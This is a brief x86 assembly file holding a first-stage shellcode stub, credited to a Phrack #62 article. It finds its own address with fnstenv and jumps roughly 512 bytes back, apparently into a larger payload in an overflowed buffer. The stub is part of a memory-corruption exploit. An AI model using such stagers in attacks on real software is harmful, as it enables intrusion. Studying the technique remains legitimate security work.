; ############################################################
; # 1st stage shellcode:
; ############################################################
; # [BITS 32]

section .text

  global _start

 _start:
;--- Taken from phrack #62 Article 7 Originally written by Aaron Adams
  nop
  nop
;--- copy eip into ecx
  fldz
  fnstenv [esp-12]
  pop ecx
  add cl, 10
  nop
;----------------------------------------------------------------------
  dec ch  ; ecx=-256;
  dec ch  ; ecx=-256;
  jmp ecx ; lets jmp ecx (current location - 512) 

